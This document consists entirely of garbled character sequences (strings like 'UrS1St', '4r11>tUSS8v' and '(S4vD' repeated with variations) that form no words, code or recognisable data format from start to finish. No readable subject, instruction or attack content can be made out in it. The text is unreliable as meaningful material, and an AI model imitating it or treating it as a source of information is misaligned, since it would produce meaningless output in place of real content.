-UI4>1->vt(S4vD U(v4(14>DUt8cv  ruD4ttc> UrS.-O-I >eS(8Uo1>ttcSr8c(01I8>( IS>v- U--8c3rIIIDUU>vD(848v1 c4UDSUvtvtcS 8nrt1ScU8U8(K-11 rr>1UtSSv8 &<14t1S>v8ZSIv> 1S>--4v4(II-D=S-c8(844v> (4SDvU t t8Si 4r-1vcSv-8Rt(c1 >rU1Stv4 tS8411>(SU8Suv URcI(DV-tv>IU-vvS(FI4>14(>tU8vtD U8v4(14> S4D1D  rSD4U1c>SD818Sr81It8r1I8tUSS8v-t8r(AI->I-U8-C-I-vf( I1>>-UDI-cvD vt4v1(>4U1Ux(c  )441cU>cU S(vI t{c4 1r>1UtUSvvv1>14t4S>8IXSIv> -e8-f1I>>U-Uvv(v4)14UIv>(U4SDvU c8(4r48-UUcU vr>1uU4c1v>8I1StSS 8 r4ISt>->S-&vIc>a- 81)>IUDUUcv (vI4D.->vU(S4vDcUOcY(144DUUUcv8vrrD4Urc>8vrS1vt ULvDr11ItUSt8v38ITD4S48>3DIS>-- vD^4I1D>-UvS(v4cD!-rv1 1ScDSUvc  I44D1U>S>rlrv18tfSc 1r>1UtSD488uQ14t4S>8t5S4SD8-,84Q148>U-Svv8 r{>4-1v>(U4SDSU S 4U41D1UUcD vr 1)U4cc >rU1StSS 8 r441DuSU8SKvI >K-v81(1cc>S-Sv (UI4>1->SUcD4vDvU}c*(1rvDUtUUc  r8D4tAc> UrSIS>rSV8 r114tUSS8vk 48t4S48>K1IS>S- c  >I1>I-Uc (v4 D*t4S (>4DDSU-c  (44I1>-cU trv1ct^St 1r>1rtSSv8 J814tIS>8US4Iv> -m8r01I>>U-Svv( 4A>4U4v>(U4SDvUtc+(441r44I1ttUSv r}-c1 4rU1Stv>ct1S-81t>- 8SBvI 4-I8D:cI8I(U4>>D-8v8>1-4vU(S4v(t4(DDU(4>D1UScv  S-(rrc14 tr-1vtUSX 4r1WII4IUtcSr8ct4-c8>lUIS4-I>>(UJ8I=I41>DUS4 D -4v1(>v-rIUcc  {r4D1U>cUS4St rr(11tDS8 14UI8>(-v(4rII1>16SID> -684c1vSNt4r>tUvc8>4Ucv>(U4Sr14DD-UScU 84rD4tUr 1 U4c1 >v1(StvSD8Pr4114II1>c-v S(-I8>(-UIUDv-vv (F v(c4U>1c1vI vr81 crc  (r DU  rDD4U1c>-vSc -r811-4SU D((1D>Si IUt4S18>v>vc_U4DU8->vc(>>rvS(v4 DSScv1(>4U41Uvc8 #4rD1U4>S -rv1 1Sc4 Ir>I>(8Sv88sCI-t1S>8U8S(I>8-(84(DI>>4-ScS 84%>r-1vr(U4SDvU c-(44ID>UtcS cr I >tc1 DrUIvtvS 8s(54ct>S>8SZUI >_S4c1(IIU>U-vvv(_4(>1U1cI(S4UD U1v4(14>DU>&cv vr<1 U1c1 U(S1tt S  4r41>>tSScv(4Ii>0S181pUI4>vt Uc/4I4>>->vS(r4 Ig18v1(14UDUUvct K44(SUDct SrS1 t(c484X(1Ut-Sv8-uf14t1S>c-E-Ic> -(84fII>D>r8vv(84QD -1v>(U.Sv-U c((44ID>UDcS8Srr1:t(c18SrU1StvS 81r41It>SD8SNSI 1;-&81KDIU>--vc8(,r4DU->vt(S4cD UUv481r-DUU-cv 8r_1tU1->8-rS1St S( 4<11>>>8M8v}SIZD9S18>xUISDI- v /44Y>>->vS(>1tD=U5v18t4UD-Uvc8 wr ^>UDcU S(81 t(c48ZvU1ttSSvcSfm1rt1U>vU=SIS> -(84(1I>D>vMvv(S4h1&-1v>(U4S>IU c (4riD>U>cSvv_r1Rt*c1 1rU1-tvS 81r414t>S>8SEcI D 4D81C1IU>r-vv (}M4/c-Dv>(Sr8D U>v4 4ZcDUUUcv Dr5D4U1U>8IrS1St S  4&S1>>>-18vavI}> S18>9UrS>>- v ;4I4>>UvvS8v4DDRUwv1(14U1-Uv- 8c44D4U>c> Sr11 DHS4 1rI1UtUSvv _#4MDiS>8IsS4(> -k84a1rv>U-tvv(-4PD%-1cVr(4SD-U US(44ID>UUcS UvF1(U4c1S)rU1-tvU vdr41rt>S>8S(vI D 8U81HrIUD8-vv (?I4>c->vD(S4tD U v48141DUUtcv cr&DrU1c>8vrS1-t S  4rI1>tU148v= IOtrS18>/UI->v- vT:44(>>-UvS(vrlDX-4v1SrcU(>4c1SUcvI0r4r11t>cI8_r-c488r>1UtS1Dt--v8c%(IU>4hSI4> -%84vIvr(14cSvS cc(1IrD (U41DvU c_SDScKU4t18Utr 1SU4c1 >8D8cf 1UttScISt>SU8S(S8U>(Sr81<1IU>S-vv (vI4>I->vt(S4SD >?S>(14DDUU-cv -ru14UIc> trS1-t SL 4*41ItUS-8vR8IMt4S1v1(tIS>S- v u4I1>>-UcS(v4vDC-rv1(14UIS1tc   44D4U>c1 Srv14tecr 1r11Ut-Sv8 SU14t1S>8tySIv> -(8491I>>U-4vv( 43>4U(v>(U4S v4cD(U>cUD>UrcS vr  -r8Ijt(cI8v+>S 8 r411t>1--I^vIS>hS481U(8tGr4Uv (tI4>1->UtUDcU (>9tv-Ic1 cUSS   rjD4IrDrtvcD -OSUZ-DSD8UCDI>tt-vIF>vS18>LU(t(84f>S--v8>>-4vS(v4 r-4IDUt8cS(Dttc  M4414s-cU Srv1StPc4 1r>t(tSSv8 :(14t4S>844IIv> -Kv8X1ID>U--vv(S 4>r-1v>(I4SDcU cvS14ID>UUS> vr81g>nIt >rU1StSS 8Cr411S8SU8S9vI8>u-381 >(I>S-vv (_I4D8->SUcD4vD Uxv4(14rDUU1 I  ryD4U1c> trS1vt Sv-1rI1>tUSS8vx8IiDx4t8>)UIS>-- vwA4r14r-UvS(v4 D^Uvv1v7UvDSUvc  244DIU>S; SrU(lt(c4 1r>1Ut-Svvv-I14t1S>8t+SIv> -SS-dIID>U-Svv(84+>r-1v>Is4SDvU c9(441D>UUS  vr 1Jt0c1 DrU1>4 S88Ar411t>St8S?v8>>QS481XDIU>S-vv ((I4>1->--(S4vD UBc (14>DU4IDcUrccD4t-c> UrS(GP(18UrSU(>)v1->IS-v t4- 8>CUIS4-I4>t-8v>(4-Uv>(v4 DGI D(t c1Dt-B>U4 ZI>tvc r4crv1Dtkc4 1ct -IDI t-SI8-_(II8U(vIv> -?t(-(vS9IItDU8  I(I4>DIU1vD SU c (441D>I1>S -8vU4UtcDS S(u>IvS 8cr411t>D1tr-U84Rc-(d8DIr8>S>81rDUt1>1U!vU(S4vrt4rD>tccU(IUScI  rWD4IvDrUtS 8Ur>> UrS41ItUSS8vB I.44rk->OD8DrDD:>zUS1_v18SvS(-4 D,-4tcUI tDSU>c  F44rrIz1>U-S( -t(c4 1;81UtSSv>tSrvF2-II>US-8-h--84Sv8(8SU41 UDv(4>4U8v>(U4SrtrZD(U?cU(r41ct vr 1MU4c1 >4UOctvS-8^r411z>1ttr-Svc>f--81.>IU4tI1>8U 8rpr44>IUU4vDtUQv4(1c((Ir>DDU-c48vUrII(rrm18Sr(-(DDD1>tDSS8v+ 84Y8488>(UIS>v- UUU8vt3D4SDc-IvSp 4IDDU48U(-rS1S 8Itc--vI-tc>v( cXc48cr>1UtSD(t8S-81=cI4>IS>8t> --84&1I>r4ID>-USvr &>rvIFv81-S>(8IIt18rtUUc1 vr 1<I(1DtUc4 rrDS 8cr411t>Dc>cSU8-%1S4vpu>IU>S4D>8-tc >1U vU(S4vN 4r1(Ucc4 (rc1   r D4U1c>U-8I1v>hSX 4r1(_5(IvtUvU8t(jIr>4vD84BII4>v344->>-UvScDv- v1(DvU8cv(>rSD-U4441pU>cU Sv- DY>18 1r41UtSSv-rS(8-e>S>84bSIv> 1rtIct8D((4vvv(t4E>4-1t>Uvv- I4-1 t(4rD>UUcS vr 1,U4t1 IUcc>c(v(8U( S(IUSU8rKvI >Q>rD(-4v-1SD>>8U vD>rI(>81->88S4y_vc1v>DUUScv8vU-D4U1c>8rrS1vt - 8Dr11DtUS-8v! I/D4->8>9tIS>c- c8l4r1>1-Uv-(v48D=>Uv18>4>DSUcc  (441 U>-U8/rv18t+cr 1rI1UDS-U8 ,(14tIS>crYSIv1>-p8r+1I1>U-Svv( rD>4-1v>(U4SDSU cvS14ID>UUD8 vr81E>4S1 >rI1StUS var4I4SvSU8I/vrv>KS481H>r(>S-tv (-I4>4->v44r4vD-U%>D(14DDUUScv S84DrU1c>UcrS1ct UP84r11rtUS>8v UINDQ8S8>}rISD(- v._4I118-UvD(v4tDxUFv1 01(DSUtc -I44DIU>cU SrU(#t(c4 1c-1Ut-Svc vc14>(S>81)S4(> tp1(}1Ir>U-Dvv8D4f14t-v>(I4SDtU c>(4m1I-UUcD vr-1Rt c181l(1St>S 8Ur411t>->8U3vIt>b-r815>IU1SU4v (-I4D8->S8(SrS1 UOcS(1(tDUUScv8vDSD4tcc>8(rS1vt - v r1IvtUU88vQ I&D9UU8>(8ISD4- v9!4441v-Uc (vOrDg-4v1 1r1DSt(c  c44D1U>S>8>rvI!tu-  1r>1U>US18 dr14D S>8U/S4SS1-*v4i14t>U-Svv v>>>4UIv>8U4SDvU S c84111UUS( vr 12>_Sv >?D1S>4S 8)r411trSU8I&v4c>wS481!>It>S->v (AI4>I->S4 S4vD-U=->(14DDUt cv S84DrU1c>cvrS1ct Sv-1rI1>tU188v{8I<D4D(8>+4IS>U- c1F4r11D-tv1(v4UD#>Sv1 1r-DSUDc 8r44D1U>-U81rv1ttnSc 1(c1U>U-I8 :U141US>8UeS4S>1-%v-i1LS>U-Svv vrc>4USv> 44SDvU cs I411(UUSw vrv1*tv t >r41S1DS 8(r4I8t>S1UvacI >&>c81pDIU>>1 v8(kI49t->vt(S)vr-U=cv(144DU> cvv vcD4t c> 4rS4Ut - vcr1I(tUS-8vZ I2D4-c8>arIS>D- SD_4r11v-UvI(v4tDhUBv18>r-DSUDc  -44IvU>-U84rv1tt_Sc 1(S1UDSSt8 n-14>8S>c1jSIvgs-(vv*14J>U-Ivv8  c>4U v>(44SI U -S(D411{UUt> vr81ut1c1 4vS1-tvS -vr41It>S1UvscI >i1D81HDIUDUr(v (SI41r->vU(S4vrtU(cv(14DDUU-cv8v*SD4t c>8^rS1vt U38>r1I(tUS>8v(4IPD4- 8>CrIS>D- c(x4I118-Uv4(v4 D_-4v1(>rcDSUDc  -441vU>cUv8rv1Ut#S) 1rD1U>UtI8 QS14DcS>8U2SIvDS-Avv*1ID>U-Uvv8 rI>4U v>(44SIcU -C 8411+UUc1 v 01ftvSD >r41S4-S 8(r41It>S1Uv#cI >T1(81_DIU>>1 v8(BI4Mt->vt(SrS rUgcv(1!rDUUScvv 8cD4t c> 4rS1Dt US rr1IHtUD48v{8Ik>>S184cSI->v- tUW4II>>-1tv(c4 DHIDv1(D4UIS1tc  S441:U>Sc S(vi-tOSv 13V1U>DSvcUl(14> S>tc6SIc> U 84(/ U>t-SvvSr4e>r-1v4SS4-DvU tv(44ID>U4SU vr 1btUc1 DrU1UtvSS-4rr11t>- 8S,cI >_IS81z>IU>--vv (=I4>1->vU(S41D Usv4(1rxDUUScvSccr 1r 18UrrSI t SZ 4vr rmv1Dt--SrC4DID>U-Dv>wt4vvK(cI1>>-U>I-tcS(-48D>tZ4UD>Uvc  jSc(Ir811 Sr>1 t=c4SISU 1rDIS>cd}I-t1S>8Uv-vt(SIrc4c 8D(>48vv(-4i>4-1D>-Dv- P44cf .41D>UUDcSD!-1eU4c181-c1StvS 8vr411t>SUrrEvI >xSr81=1IU>1vIv (hI41L->vt(S4vD Uvt1(I4>DUt>cv 8rGIkEtc> UrS1-t SM 4r1t8tUSS8vp8Ii>JS1c>vIIS>v- vO;4II>>tUUD(v4 Dz-4v1 _4UD1cIc  ,44D1U>ct Srv1 tv>1 Ir>1UtSSv88m<4P(tS>8UGSI1> -s84 1(r>U-Svv( 42Db-1-<(t4SDvU cr(44ID>UIcS UvC1(U4c18trU1-tvSS-4rr11t>SU8S?cI D 4D81^>IU>I-vv (34vIc-Dvt(S4vD U(v4(I4>DU84cv  rHD4U1c> UrSIKt So 4r41>ttSS8UcZI(t4S18>=UI->v- >UE4I1>>-tvS(v4 D:-rv1(>4U4cUvc  ;r(- Dr (UcD81(-r(I 1r41UtSSv>tS(8-(6SIrcv 1DS(/-c3U1(t>UU(vv( 4or>4D>I-tc lv44D(t-c( 1UUcr vr 1QI(1vUDS> -r-IStc-x11>8SU8STv(rB(Ic>>-8v1(DIU>-(b4(>1->vUUvvt tU8v4(14>DUUScv(  rD4t8c> UrS Dr-IvtcS(8Us4SS8tJ Ist4Dt>tS18D(J- vt}4I1>>DtDDUUc(I01v>IU1ccDSUUc  j44(J4rIyt>r-(4cc4S41vUt8 t> 8 zv14t1S>trS-v(Y--svv*1I>>UDtD=-Dvc(1rRv> (4SDvU tUU8vI Sr1D4SSc88 U4SQ >rU1S4-1D>>S811>>SU8Suv(>(cIDtI-Uv-CrIUtv-rvI :1>>tUUcUD USv4(14>rtrvDUU-S 8(Ur(-Sv4IU8 t- >4DD1>t4SS8v< (8CII>>H-(8I>-- vb_4I1>>1U1>cv4cD}-4v1(>4UDSUvt  Hr8D1U>cUtScc D{ I( 1r11UtSSvt(v-14>8S>8UzS vn4I(D--(v1(D-tSrv-cDv4I(8>tv>SD--v4t{>UDS(811r4vr 1vU4c1 >vc -rIIV88I8 1{1 U8S>UScI4S4v g>IU>SI8>(cI8r(c4UvU(14vD Uft(S c1(tr8Dt  r4D4U1c>S4cr8 rS>St-S48IW1>tt1SD81l S1v(?UIS>v1U>c-(c0(t4>-t(v4-DX-4v1S4c( >roD- 888S14ncU ct-cc14c48cr>1UtSID>(- 8tdrI>ttSt8t>8-s84(>I>>U-St---v1(8IrD48U88 8rC18t c( 1UUc4 vr 1PI41DtIS(8>rII(t4!(cr((S>ISScv488>181((IU>S-vU--48r.44S>I->4vDvUov4(184_UUScr  r&D4I8Drt18t 1rD11t S4 rhSSt>1Dv(Mr4rSU(vv(S>v-cvY?4I1r84DU-(v4DD_-4v1-tv-rDr D-UIc- (rIDU Srv1 > rc 1r>1U>4Sv8 ?p4EtrS>8tCS4 > -a84 1rc>U--vv(84wI8-1S>8 4SDcU c((4{DD>>USU vr81oUrc1ctrU4S>DS 8(r41It>--8S vIv>kSr81VDIUI -vv 8UI4>I->v>(S4vD UGSt(14>DUUScv vr51 I>cD UrS (t S( 4(1I>tUSD8vASIW11S1v1I IS>D- v>h4I1>>-Ucr(v4-DVUcv1(14UD1SDc  c4411U>ct Src1 tv>1 Ir>1U>SSv88y0I 4>SD8U&S8(> -(84 14>>U-Dvv(S4J1r-1c14 4SDDU Sx(441D>UUSr vr-1gtcc1 1rU11-DS 8cr44 t>St8SMcI >vD18Ix>IUD1-vv8(u4 r>-DvU(Sv(D U(v481 rDUUDcv SrZ14U1->>DrS1tt Sc 4(t1>DUS-8v_-IA>8S1cIGUrSD - vcC44(>>UvvS SrSD,Uvv1vc4UDSUvSv8S4418U>-U Srv1 DWSv 1K(1UtISv8tHB40D(S>vdbS4r> -a84(4>6>U-rvv8r4Y>4-1c1 c4SD4U S1(441D>t>c> vrI1eUrc1 >rUIU>8S 81r4Itt>SU8S(SID>7-D81(4IU>S-vcv SI4D>->SS(S4vD t S8(1rtDUU4cv  r;I<cSc>8UrS4Ut SM 4z4tvtU--8v!cIYt4S1v1DrISDS- Sty4I1>>U>c>(vrcDe-rv1(>4UDStDc  -441rU>cU Srv11tNSv 1r>1Ut-SvcU(814>(S>tcBSIc> U884(o U>t-SvvSr4b>r-1S>cI4SD>U cv(4r4D>>U-- crU1Ytvc18DrUIUt4S 8-r444t>SU8S v4 >O-c81((IU>I-vcv(UI4Dv->cr(S4vD t Sv(1r8DUtIcv  r7IOUIc>8 rS11t SN 4r11rtUSI8vm1Id>AS1vHc>I->>- tIN4II>>-rvS(U8uD(-4v1--4UD-Uv- Sc441 U>c1 SPS1 D5D8 1!j1Ut1Svc>n^4N>SS>8r?S4 > -784 144>U-Ivv(t4k1U-1S> D4SDDU c-(4roD>>USU vrt1_tcc1 rrU4StSS 8-r4I8t>->8S v4W>E-c81((IU14-vv S4IrD ->v4(S4DD >ft8(1r,DUU1cv Ury4vUtc> 4rSEUt S( 4( 1>t1Dv8cK If4 S18D!UI>r -8vxp48t>>-tvS ScrDlUvv1(14UDSUvc S-4r1 U>ct Src1 > S1 1Ll1U1(Sv8 _Z44>8S>8rBSIU> U 84 148>U-Ivv(t4o14-1v> 14SD1U cL(441D>UU-8 vrt1Ptcc18 rU1StrS 8Sr414t>St8S(SdD>+-v81(8IU>S-vv   I4D ->vt(S4SD >pS>(1rdDUU1cv8-r0I4>(c> 4rS1>t SD 4j I8tUS18vccI^trS18DxUI>r -8v;.4 r>>-tvS(U89D(-4v1--4UD-UvSvtI441 U>-( Srv1 Du>8 1d^1Ut1SvctV6rvtIS>84QS 1> -(84(rI>>11vvc( 4WuS-1vD(U4>i U8c3(4vtD>UtcSvv8-1Wtvc1 4rUIStvU -cr4I t>S48S 4I 1SSr81(QIUi8-vv8(_Kv>1-4tS(-4vD IIv4(I4>D1Ivcc  r_i U1cD Ur1ISt S{ 46S1>ttSS8S5 Iv41SI8>}U4M>v-8vBW4vv>>-UvS(c4 DX-4v1(>4UDSUvc> h44D1U>c1 Srv1 ;-DrtcS41UtDSv8 .{84rr1D>v- Iv>S-B84p18(((4v>U( 4t>4-1v>ctcD Ur(-fSvvI 1rccS Sr 1%U4DD-(rU1ItvS 8hSc8(541rtD- vU>{-v81!>IU4t48DJ-Sv-(8->cS(S4vD I8D8UUvr(Dr>-vSrcr 1rr14UISUIUt S& 4l4v-tUSS8vh8I3t4S18>I(IS>v- v(b4I4>>-4(r(v4 DYt(v1(D4UDSUvcSS44rD1U>SD Src1 > ID 1r>1Ut1Sv8 *n14ScS>8U3SIc> - 84 1(r>U-Svv( 4EDc-1S>cI4SDvU cT(4rPD>U4 r vr 1FU4c1 DrU1StvSS-4rr11t>SU8SEcI D 4D81<>IU>D-vv ({r4r(->vU(S4vD UUv4v USDUUScv  rpDrU1cI Ur>( t8SE 4r11>ttSSvS-rIZt4S181zUIS>v-USt2rII>>-UvS(c4 D(-4v1I 4UDSUvc  /44D1U>Sv Srv1 t c4 Ir>114vSc8 WY14t1SD8UhS81> -O84)II>>U-Svv(84y>4-1-t(U4SDvUc(cD>v ->-D88S-8 184ct-1D(-> (vr S4r4I t>SU8Sv-(U( 1r>tSrIDSrt1ttcA(vrU v{-(S4ID U/v4Svvr(tr 1UU>8 (rr4c> 1rS1vt D-t-S> 4tUS18vX I,rI1DU-St8r( - v-Z4I1>>Ir>DUUvt(c411 (>4rDSUvc Scc1(I411vUDcU1 tDc4 1r>(v9c1-t8S1(4=U1DD(SDvS> -U84%1I>rU4cD--Dcv(-4DDU(U4rDvU c_crS( 4r--SS>c88 rDc1 rrU1StvDStt- 8UrrSU8>xvI >lIctI--8I>tt>(DvvI4((->t IS4vDcUJv4(188 D1-c-t>I4Sg4Dc>-8UUl t S- 4r11>4UI tc-D8c(HIr8I(r-c>SI  vc(tY4>-Uvr(v4 Dm1(Dv-Dc>(-4-1SUcS7DIU>cU >rv1 t!>DUIS88StS-v8 x}144vIr>cS-v ((It> c4vt(-4>tv-8c   -1c((U4SDvIUDcU(S6 tr>Ut vrc1AU4c1tUcI8ItvS-8dr4114-I-t>St84>8>81DrSD-IcSt8(vrI4D ->vU(S -(44tD8U>c4DUt(cv  rQLcr(14SDc4 Ir41v>;S(8UtUSr8v% I+rI1D-r-S8D((ID>cU(I1>r-UvS(vc ((4-D4UI4UDrUvc  +Sc Dr118ttSv 8r818 r(I(I1 _vX SDcrI>S>81?SIv> 18>-US8r>U->vv( 4^ cIID8U14tDvU cy(441D>UUtS vrD1ZU4c1--ct I) 1D>v-88JrrSU8U:vI >x1 U17>I1>S-vv Svv8 v44vU v4vD UwtvUccU(111DItvS88 1r1 t(S  Utc1Ura4t>tStI(1c19I8t4S18>QUISrvrSU%^44 >>-UvSc-c((44vDcU(4DDSUvc  A44D1->t- SrS1 t_c4UDv(1U>vSv8 ;= (Q(IStIStvU1 DI>I->vI(1IDDS(c(c8ISU tv-ID>8v(D((441D>t>4I vr 19>Ic1 >rUIUt1S 8(r4I>t>SU8S v4I>%Sr81_DIU1S-vS ( I4>I->vt(S4DD >=SU(14DDUU-cvvlrzI4>cc> trS1ct -1 4(1IJtUS-8vw8IwDDS18>86IS>c- v 24I1>>-US((v4 D7-4v1(14UD>I c8 Y44(>U>ct S(vI tHS8 1r41U>SSvvv1>14>8S>c /SIv> -Oc-71Ir>U-Ivv(v4<DvS8v>(I4S1vU c((44ID>U1>v cr 1Ct4c1 DrU1>4 S88=r4 >t>St8S v4 >9-881Q4IU14-vcvI>I4D8->vI(S4vD UfS-(14rDUUIcv vr+1v-8c> IrSI>t S( 4rI1>t1Dv8c? ILDvS18D*UI>r -8vZ!48>>>-tvS8v -DnU8v1(44UDDUv- >8441(U>cI S<>1 D+-< 1rr1UtDSv8rTJ44>-S>8I.SIt> t-84(444>U-1vv8U45>4-1c1 v4SDDU c8(441D>>Uct vrt1ftcc1v8rUIU> S 8Ur4IDt>SU8S(StU>Q--81ODIU>S-vcv(>I4DS->cD(S4vD t S;(1rcDUU>cv  r_IjUrc>8vrSIct S0 49448tU-88v(IIjt4S1v1 (ISD - S(A4I1>>U>cS(vr(D=>>v1(>4U1Uv4c 8,444cU>cU SfSU1tLSr 1 t1UtSSvvv8c14>4S>8>#SIv> U v-x14I>U->vv( 4;>4U4v>(r4S1-U cs(4411SUUc1 vr 1BUrc1cP<v1SttS c4r41It>S48SeU N>(S4818UIU>--vvSc4Ir>1->>S(S4cD >Tt8(1r#DUU>cv8trbI4>IcD 4rS1>t U  4_4I1tUSI8v(>Iyt4S1c>((IS>D- v-j4rc>>U>c>(v4>Du> v1(>4U1Ut c  t4442U>cU S2SI8t_SU 1 S1UtSSv8 (>14>8S>v ESIS> -S%DK14u>U>rvv(84_Dc-1v4SS4-DvU Ut(44ID>U1>v cr 1j41c1 DrU4SItS 8Sr4Iot>-r8S v ->g-v81(NIUD(-vcv((I4D8->cS(S4vD >OS>(1r(DUUIcv8vr{I4t c> rrS1Dt S> 4(1IDtUSI8v3tICD S1c>TrIS>D- v-=4r8>>tUvU(v4tD0Ucv1 c4UDS4 c8 S441 U>cr S(vW-t<Sv 1u_1UDDSvcU8E1r> S>tSeSIc> t>84(i U>t-Svv-_43>r-1c1tc4SD>U -8(441D>UUtI crU16Urc1 DrUIU>>S 8Sr4r t>SU8S vI->P-c81P4IUDI-vS (1I4D8->vr(S4-D U*cD(1r DUUScv  r_D4>cc> rrS1Dt SU 4r1I9tUS18vFvI/trS1v1v(IS>>- vUw4I1>>-UvD(v4UD=-rv1(14UISU>c  S441 U>U8 S(vI8t_Sv 1ml1U> Sv8U((14> S>U1ySIc> -(84(7 U>t-SvvSS4P>r-1v4SS4-DvU >4(44ID>t>I8 vrU1jDDc1 >rU4SItS 8Sr4I t>tS8S >I8>j-v81S8IU>--vvU(Z4 r>-DvU(S8ID U(v4 %8UDtUScvUWrgDrU1->SIrS1>t Sv 4}(1>DU>D8v_UIe>vS1v8&Ur1>c- vSl48>>>-tvS t4 Dv11vI(>4U(vUvc8 _r i>UDcU S8t1 t(c48 W11UtSSv81sX1rt1S18U/>  >8-w84(SI>>t-Svv->4%>4-1vD(U4SDvU c_(441D>U4cS vr 1Vtcc1 >rU(Sm)18>tS884mISUvskvI >JDc>(-4 DZD4SDU-tv(((->c-(S4vD IvD8UUvr Urc1StSv8 8r4Iyt(ct tt Sv 4r11>rr1->(S-IZ>8S18>kUvS%-I8>1->I1Dc-UvS(v 4(r4(>IUS8U  4c1DUcS611U>cU SxSI>t(c4 1r41UtSSvc pt14t1S>8U*SIS> U v8K1I1>U-tvv( 4#>4tSv>(U4SDSU c (4r4I(UUc- vrS1AU4c1v>% 1StcS 8(r41It>UUc(AvI8>XSr81(^IU>1-tv ((I4DS->vt(S4cD Uvt1(I4>DUt5cv 8r*1 I>cD UrSI8t S( 4_4v-tUSU8vV-IBt4S1vK8(I->-- v9H4II>>->vS(v9ID(-4v1(>4UDSUvc vD4rD1U>ct Srv1 txS> 1r11UtUSv88b)14=vS>8UQSIc> -j84Y1ID>U-Svv(c4l>4-1v> _4SDvU >vU8cU(rrU1ctSSS1ft c1 >rU Irc1rtcr4I8t>SU8Scv84?(I(>(c881>I-vv (OI4GU-DvU(S4vD UWv481&8DUUScv  r&DrU1S1 rrS1St S  4r11>DUSt8vjvIW>9S18I}UISDU- v8P4II>>-UvS(v44D;-4v1(I4UD-Uvc 8U44D1U>ct Srv1 twc4 1r>1Ut4Sv8 3Z14>>S>8U+S -L-I1>8Srv41U18D8UGc8  4(D1(U41DvU cJS(cD U44DrUDr 1-U4c1 >cr D*U1ttcS1v t>S48S7vI 4-II>r-rv83D-vvv(6I4>1ItUr(S4ID Uyv4cIcr 1rc-vSUc(8Rrtc> 1rS1vt I-UrSc84tUSD8vM IPx41rtD-vv Dt- vYs444 --UvS(v4tDR-4v1(>D(DSUvc  (44D4U>c4QIrv1 t7S8 1rD1Ut-Sv8Sv41rt1S>8IzSIc> -vU1}II>>UU>vv(84f1Trtv>(U4SD-U cT(441U8UUcS vr81#t=c1v>8I1StvS 8Rr414t>UU-DwvI >;S481(BIU>1vIv (FI4>1->vt(S4vD Uvt1(I4>DUUScv 8rxIh&tc> UrS1tt Sk 4(1XrtUSS8vM I{trS1SC>vIS>v- v)p4II>>-1vS(U8MD(-4v1(>4UD-UvSvtI44D1U>SE Srv1 tSU- IrD1UtSSv88R,1rt1S>rwdSIv> -*84.1I>>UU vv( 4+DR-1vD(U4>w U8c#(441D>UtcS vc>1+U4c1 DrU1StvS 8(r411t>t-8SyvI >x- 81s>IUr8Ic>D-4I4Dc->vU(S 1(-4(D>t5c r>4-1S  rvD4U1c>trc- IVSS8 4r11>tUSS8vN (Wt4->8>:UIS4>ID>4-   (84>DtUU c(U4-DU-44UDIUvc  3vv (4I11tcSSrct8U(D- SvUc1-1(n8r14>cS>8UKS (98I->1-cv4(II>>t(cR-DrcI>t(1Ut -v cM c41D>UUtDt c8  r>1(U4rU1rtvS 8e-c8D)1I8>t-v88F8I88r IS8I rvKU UD1SD-I(S4Uc>8(I-ct>D>UDUUtcv  r! 1r(I( Ur11vt Sj-cSD8IyII(ttpcv>ID84rtD)(8t2D(vO(8I1>>-UDS-cvD  r(v1(44UDSUvDtU(cD (UIr/cc 8U -ScU4H8>1UtrSv8 Hi((kv1D>>S-8-(SIcDjO14 >U-SvvS vr (4cD4U(cc  UccE(441D>UU>S>U8 18U4c1 >rU1Stvc SrY(>D- >8tcc>II r 181BIIU>S-vUDU8(r>1-4vU(S4v_c4t1UU(4>DIUScv  8I IrzDrtvrS1>t SC 4cD t4c1-tI-hI.>8S18>QU >kI4S>1-8I1D8-UvS(v 8 cr DD8> 4(-rSDr Vr5D1U>cUUc8D1 t-c4 1r>(U# 1c>DScv*VrSIt vvDF1(>t>-c^(>>U-Ivv( 4e(c4(D4-rvD  rUc((4411pUUcS v8c{SxBDIt-cI1S> S 8Xr4(rrrIvtDS-vS1<DD>D-UvD(>ItDv(L4t>1->vUcIvt S18DSUccS(1rUDttdrH1vU1c> U8t88=y1St-S81>t1SS8v_  v/84v>4/UIU>v- vuS  1>>UUvS(v4 rUr8Dt-DcS c4IDS- cI Dr4>UU-SS8St88c8 18S-Svr1>D84I( c154vUccI>(Vv-1,148>U-Svv-(8rr84>>rUcvr(trcc2 t41D>UU> t8cc (r>>1tSct8rrtIv8hPv11t>SU-t-<8DdcI1D%StIU>S-vcv>-I4>1->ct(S4vD t SU(14DDUtUcv  r/I4U4c> trS1ct SD 4(1I-tUS-8v#8IKD>S1c>((IS>c- v(%49t>>tUc1(v48DZ-rv1vt4UISUtc  (44DIU>-4 Srv4>tucr 1r11UtSSv8 (D14t1S>8U:SIS> -vU1&II>>UI vv(84514U1v>(I4SDUU St(4r4UvUUcI v2I1aU4c1 >((1SttS 8-r414t>S4(IyvI->!-481=DIU>--vvSc4Ir>1->cU(S4cD Uvt1(I4>DU4 cv 8r?I4t1c> IrS1Ut Sc 4x4tvtUSI8v3vI9t4S18> (IS>t- v-Q4I4>>-4(r(v4-D/I>v1(D4UDSUvcSS44rD1U>Dv Src1 DJ>8 1rr1Ut>Sv8vQ)44(rS>8I{SIt> -(84 14t>U-Dvv(-4*1D-1S> 44SDtU cc(4(vD>t>c> vrU1kD-c1 >rUIU>SS 8-r4rNt>SU8S v4 >H-c81((IUDv-vcv(SI4Dv->cD(S4vD t (v(1r8DU>-cv  rPIAtcc>8 rS1It Sh 4A4IttU-(8v( IHt4S1v1(vISD_- S1M4I1>>U>vr(v4rDQUcv1(>4U1Utvc  4441tU>cU S_SI8tpSI 1((1UtSSvvv1>14>1S>c.NSIv> U iU614D>UU vv( 4+1%D(v> >4SIrU c/(4r4IcUUSt v{ 1{U4c1 >wr1StDS v8r411t>SUv fvIU>{S481TDIU11U=v (cI4It->vt(Sr8D Uvt1(I4>DUD8cv 8r}1 I>cD UrS :t S( 4(1frtUS18vLSIN1US1c> tI->>- vS*4rS>>U>c1(v4tDkUvv1(>4UISUrc  -4418U>SS SmSI tRSS 1r41UtSSvvv(>14>cS>81QSIv> U v1d14v>UUIvv( 4E>4t-v>(r4SD4U c (4r U-UUc1 v >1+Urc18(rU1>4 S88Mr4Gvt>St8S}U u>(S481SSIU>--vS ccI4D ->v1(Sz4D >Z>8(1r=DUU1cv8-ryIMtcc> rrSISt SV 4(11rtUSI8vOtIXD4S1c>31IS>D- v-74,>>>tUcc(v4tDaUcv1 44UIStIc  -4418U>U  S(vIctFSc 1f(1U>DSv8 c41r> S>84ASID> tyU8Q14_>U-1vv(>4FIv>1vD(44S(GU 